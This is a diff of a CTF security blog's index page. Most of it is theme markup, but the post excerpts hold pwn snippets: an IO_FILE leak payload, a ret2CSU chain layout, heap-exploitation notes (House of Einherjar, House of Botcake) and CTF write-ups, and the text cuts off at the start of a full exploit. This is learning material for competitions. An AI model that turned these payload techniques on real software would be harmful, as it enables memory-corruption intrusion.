@@ -1,208 +1,272 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Head tag -->
 <head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <!--Description-->
-    
-        <meta name="description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛">
-    
-
-    <!--Author-->
-    
-        <meta name="author" content="Trident91">
-    
-
-    <!--Open Graph Title-->
-    
-        <meta property="og:title" content="Trident91&#39;s Blog"/>
-    
-
-    <!--Open Graph Description-->
-    
-        <meta property="og:description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛" />
-    
-
-    <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="Trident91&#39;s Blog"/>
-
-    <!--Type page-->
-    
-        <meta property="og:type" content="website" />
-    
-
-    <!--Page Cover-->
-    
-
-    
-        <meta name="twitter:card" content="summary" />
-    
-    
-    
-
-    <!-- Title -->
-    
-    <title>Trident91&#39;s Blog</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
-
-    <!-- Custom Fonts -->
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
-    <!-- Gallery -->
-    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
-
-    <!-- Custom CSS -->
-    
-<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-    <!-- Google Analytics -->
-    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"trident91.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Trident91&#39;s Den">
+<meta property="og:url" content="https://trident91.github.io/index.html">
+<meta property="og:site_name" content="Trident91&#39;s Den">
+<meta property="og:description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="Trident91">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://trident91.github.io/">
 
 
-<meta name="generator" content="Hexo 5.4.0"></head>
-
-
-
-<body>
-<!-- Live2DCubismCore script -->
-<script src="https://cdn.jsdelivr.net/gh/wangstong/live2dm3/live2d/js/live2dcubismcore.js"></script>
-<!-- Build script -->
-<script src="https://cdn.jsdelivr.net/gh/wangstong/live2dm3/live2d/js/bundle.js"></script>
-<canvas id="live2d" width="300" height="300" class="live2d" style="position: fixed; opacity: 1; left: -50px; bottom: -50px; z-index: 99999; pointer-events: none;"></canvas>
-
-<script type="text/javascript">
-  var resourcesPath = 'https://trident91.github.io/assets/'; // 指定资源文件（模型）保存的路径
-  var backImageName = ''; // 指定背景图片
-  var modelDir = ['jiaran4']; // 指定需要加载的模型
-  initDefine(resourcesPath, backImageName, modelDir); // 初始化模型
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'en'
+  };
 </script>
-<div class="bg-gradient"></div>
-<div class="bg-pattern"></div>
 
-<!-- Menu -->
-<!--Menu Links and Overlay-->
-<div class="menu-bg">
-    <div class="menu-container">
-        <ul>
-            
-            <li class="menu-item">
-                <a href="/">
-                    Home
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/archives">
-                    Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/tags">
-                    Tags
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/categories">
-                    Categories
-                </a>
-            </li>
-            
-        </ul>
+  <title>Trident91's Den</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Trident91's Den</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
 </div>
 
-<!--Hamburger Icon-->
-<nav>
-    <a href="#menu"></a>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
 </nav>
 
-<div class="container">
 
-    <!-- Main Content -->
-    <div class="row">
-    <div class="col-sm-12">
 
-        <!--Title and Logo-->
-        <header>
-    <div class="logo">
-        <a href="/"><i class="logo-icon fa fa-chess-rook" aria-hidden="true"></i></a>
-        
-            <h1 id="main-title" class="title">Trident91's Blog</h1>
-        
-    </div>
-</header>
-
-        <section class="main">
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2077/02/25/hello/">
-                Hello
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2077-02-25</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h2 id="欢迎来到我的小站"><a href="#欢迎来到我的小站" class="headerlink" title="欢迎来到我的小站"></a>欢迎来到我的小站</h2><p><del>二进制,狗都不学</del><br>本站关键词: CTF, PWN, 二进制安全……<br>当然主要还是记录本菜鸡被各种题目折磨的过程</p>
-
-        </div>
-    
 
 </div>
-            
-                
-<div class="post">
+    </header>
 
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/05/20/pwn_snippet/">
-                Pwn Snippet
-            </a>
-        </h1>
-        <div class="post-info">
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
             
-                <span class="date">2021-05-20</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/Code/">Code</a>
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://trident91.github.io/2077/02/25/hello/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Trident91">
+      <meta itemprop="description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Trident91's Den">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2077/02/25/hello/" class="post-title-link" itemprop="url">Hello</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2077-02-25 11:45:14" itemprop="dateCreated datePublished" datetime="2077-02-25T11:45:14+08:00">2077-02-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
                 </span>
-            
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-21 09:27:11" itemprop="dateModified" datetime="2021-04-21T09:27:11+08:00">2021-04-21</time>
+              </span>
+
+          
+
         </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="欢迎来到我的小站"><a href="#欢迎来到我的小站" class="headerlink" title="欢迎来到我的小站"></a>欢迎来到我的小站</h2><p><del>二进制,狗都不学</del><br>本站关键词: CTF, PWN, 二进制安全……<br>当然主要还是记录本菜鸡被各种题目折磨的过程</p>
+
+      
     </div>
 
     
-        <div class="content">
-            <h1 id="Code-Snippets-for-Pwn"><a href="#Code-Snippets-for-Pwn" class="headerlink" title="Code Snippets for Pwn"></a>Code Snippets for Pwn</h1><p>这里记录一些做CTF pwn题中大概也许可能会复用的代码片段.</p>
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://trident91.github.io/2021/05/20/pwn_snippet/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Trident91">
+      <meta itemprop="description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Trident91's Den">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/20/pwn_snippet/" class="post-title-link" itemprop="url">Pwn Snippet</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-05-20 10:05:06" itemprop="dateCreated datePublished" datetime="2021-05-20T10:05:06+08:00">2021-05-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-05-24 09:31:57" itemprop="dateModified" datetime="2021-05-24T09:31:57+08:00">2021-05-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Code/" itemprop="url" rel="index"><span itemprop="name">Code</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Code-Snippets-for-Pwn"><a href="#Code-Snippets-for-Pwn" class="headerlink" title="Code Snippets for Pwn"></a>Code Snippets for Pwn</h1><p>这里记录一些做CTF pwn题中大概也许可能会复用的代码片段.</p>
 <h3 id="magic-gadget-setcontext-61-高版本glibc"><a href="#magic-gadget-setcontext-61-高版本glibc" class="headerlink" title="magic_gadget + setcontext+61 (高版本glibc)"></a>magic_gadget + setcontext+61 (高版本glibc)</h3><p>注1: <code>the_gadget</code> 即</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x154b20:	mov    rdx,QWORD PTR [rdi+0x8]</span><br><span class="line">0x154b24:	mov    QWORD PTR [rsp],rax</span><br><span class="line">0x154b28:	call   QWORD PTR [rdx+0x20]</span><br></pre></td></tr></table></figure>
 
@@ -215,36 +279,73 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p64(0xfbad1800)+p64(0x0)*3+&#39;\x00&#39;</span><br></pre></td></tr></table></figure>
 
 <h3 id="ret2CSU"><a href="#ret2CSU" class="headerlink" title="ret2CSU"></a>ret2CSU</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p6r + p64(0) + p64(1) + fuction_ptr\ </span><br><span class="line">    + arg3 + arg2 + arg1 + mov_call\</span><br><span class="line">    + &quot;\x00&quot;*56 + return_address</span><br></pre></td></tr></table></figure>
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/05/14/House%20of%20Einherjar/">
-                House of Einherjar
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-05-14</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/Notes/">Notes</a>
-                </span>
-            
-        </div>
+      
     </div>
 
     
-        <div class="content">
-            <h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>通过off-by-one/off-by-null, 申请任意地址</p>
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://trident91.github.io/2021/05/14/House%20of%20Einherjar/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Trident91">
+      <meta itemprop="description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Trident91's Den">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/14/House%20of%20Einherjar/" class="post-title-link" itemprop="url">House of Einherjar</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-05-14 10:04:20 / Modified: 10:15:35" itemprop="dateCreated datePublished" datetime="2021-05-14T10:04:20+08:00">2021-05-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>通过off-by-one/off-by-null, 申请任意地址</p>
 <ul>
 <li>利用结果: 使malloc返回任意地址</li>
 <li>要求: 堆泄露, off-by-null</li>
@@ -276,36 +377,73 @@
 </ol>
 <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_einherjar.c">https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_einherjar.c</a></p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/05/14/House%20of%20Botcake/">
-                House of Botcake
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-05-14</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/Notes/">Notes</a>
-                </span>
-            
-        </div>
+      
     </div>
 
     
-        <div class="content">
-            <h2 id="House-of-Botcake"><a href="#House-of-Botcake" class="headerlink" title="House of Botcake"></a>House of Botcake</h2><p>2.27中也可使用, 绕过tcache double free的检测.</p>
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://trident91.github.io/2021/05/14/House%20of%20Botcake/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Trident91">
+      <meta itemprop="description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Trident91's Den">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/14/House%20of%20Botcake/" class="post-title-link" itemprop="url">House of Botcake</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-05-14 10:01:07 / Modified: 10:15:27" itemprop="dateCreated datePublished" datetime="2021-05-14T10:01:07+08:00">2021-05-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="House-of-Botcake"><a href="#House-of-Botcake" class="headerlink" title="House of Botcake"></a>House of Botcake</h2><p>2.27中也可使用, 绕过tcache double free的检测.</p>
 <ul>
 <li>利用结果: 使malloc返回任意地址</li>
 <li>要求: 存在double free</li>
@@ -327,36 +465,79 @@
 </ol>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c">https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c</a></p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/04/08/VNCTF2021/">
-                VNCTF2021 Pwn
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-04-08</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/Write-Up/">Write-Up</a>
-                </span>
-            
-        </div>
+      
     </div>
 
     
-        <div class="content">
-            <h6 id="一点废话"><a href="#一点废话" class="headerlink" title="一点废话"></a>一点废话</h6><p>2021年三月某个周日,安排本来是上午运动,下午打这个比赛. 然而篮球斗牛过程中被对手爆了头,昏了一整天,遂将这比赛鸽了…<br>过了一个月,回头看下比赛中的pwn题.</p>
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://trident91.github.io/2021/04/08/VNCTF2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Trident91">
+      <meta itemprop="description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Trident91's Den">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/08/VNCTF2021/" class="post-title-link" itemprop="url">VNCTF2021 Pwn</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-04-08 16:48:49" itemprop="dateCreated datePublished" datetime="2021-04-08T16:48:49+08:00">2021-04-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-05-20 10:53:15" itemprop="dateModified" datetime="2021-05-20T10:53:15+08:00">2021-05-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Write-Up/" itemprop="url" rel="index"><span itemprop="name">Write-Up</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h6 id="一点废话"><a href="#一点废话" class="headerlink" title="一点废话"></a>一点废话</h6><p>2021年三月某个周日,安排本来是上午运动,下午打这个比赛. 然而篮球斗牛过程中被对手爆了头,昏了一整天,遂将这比赛鸽了…<br>过了一个月,回头看下比赛中的pwn题.</p>
 <h2 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h2><p>glibc 2.32, 需要疯狂调试的一道题,令人昏迷.</p>
 <h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p><code>free</code> 后指针未清空. </p>
 <h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><ul>
@@ -425,36 +606,79 @@
 <h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这两道题都考察了对tcache_perthread_struct的直接攻击,也碰到了未接触过的知识点,好评!<br><del>那道VM题鸽了,实在不想看.</del></p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235821#">https://www.anquanke.com/post/id/235821</a> </p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/03/04/heap_writeup/">
-                简单堆题write-up
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-03-04</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/Write-Up/">Write-Up</a>
-                </span>
-            
-        </div>
+      
     </div>
 
     
-        <div class="content">
-            <h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a>ACTF_2019_babyheap</h2><p>经典的notebook题目结构, 堆利用当中最简单的类型</p>
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://trident91.github.io/2021/03/04/heap_writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Trident91">
+      <meta itemprop="description" content="天空是那么高远，那么辽阔，斧子扔得再高，也触及不到天空的皮毛">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Trident91's Den">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/04/heap_writeup/" class="post-title-link" itemprop="url">简单堆题write-up</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-03-04 11:03:54" itemprop="dateCreated datePublished" datetime="2021-03-04T11:03:54+08:00">2021-03-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-20 16:27:47" itemprop="dateModified" datetime="2021-04-20T16:27:47+08:00">2021-04-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Write-Up/" itemprop="url" rel="index"><span itemprop="name">Write-Up</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a>ACTF_2019_babyheap</h2><p>经典的notebook题目结构, 堆利用当中最简单的类型</p>
 <p>有</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">This is a heap exploit demo  </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">1. Create something           </span><br><span class="line">2. Delete something           </span><br><span class="line">3. Print something            </span><br><span class="line">4. Exit    </span><br></pre></td></tr></table></figure>
 <p>create, delete, print 三个选项。</p>
@@ -552,127 +776,183 @@
 <p>完整exp</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 